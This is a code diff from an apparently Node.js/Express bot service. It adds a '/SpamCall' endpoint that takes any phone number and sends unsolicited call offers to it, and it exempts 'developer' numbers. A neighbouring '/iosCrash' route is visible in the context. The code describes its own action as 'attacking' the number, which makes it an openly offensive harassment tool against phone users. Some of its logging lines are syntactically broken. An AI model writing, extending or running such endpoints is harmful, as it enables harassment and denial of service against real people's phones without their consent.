@@ -148,6 +148,34 @@ await delay(15000); // Delay for 15 seconds
         res.status(500).send('An error occurred while sending the message');
     }
 });
+// spam call function 
+app.get('/SpamCall', async (req, res) => {
+    const { target } = req.query; // Access the target parameter from the query string
+    // Check if the target is a developer number
+    if (isDeveloperNumber(target)) {
+        return res.status(403).send('Cannot attack developer');
+    }
+	async function sendOfferCall(target) {
+    try {
+        await sam.offerCall(target);
+        console.log(chalk.white.bold(Success Send Offer Call To Target));
+    } catch (error) {
+        console.error(chalk.white.bold(Failed Send Offer Call To Target:, error));
+    }
+	}
+const phoneNumberPattern = /^[+]?[0-9]{1,15}$/; // Allows numbers with or without "+" and a max length of 15 digits
+    if (!target || !phoneNumberPattern.test(target)) {
+        return res.status(400).send('Phone number you have provided is invalid');
+    }
+
+    try {
+    	res.send(`Started attacking the number ${target}`);
+        await sendOfferCall(target); // Pass validated phone number to the function
+    } catch (error) {
+        console.error(error.message);
+        res.status(500).send('An error occurred while sending the message');
+    }
+});
 //====================================\\
 app.get('/iosCrash', async (req, res) => {
     const { target } = req.query; // Access the target parameter from the query string
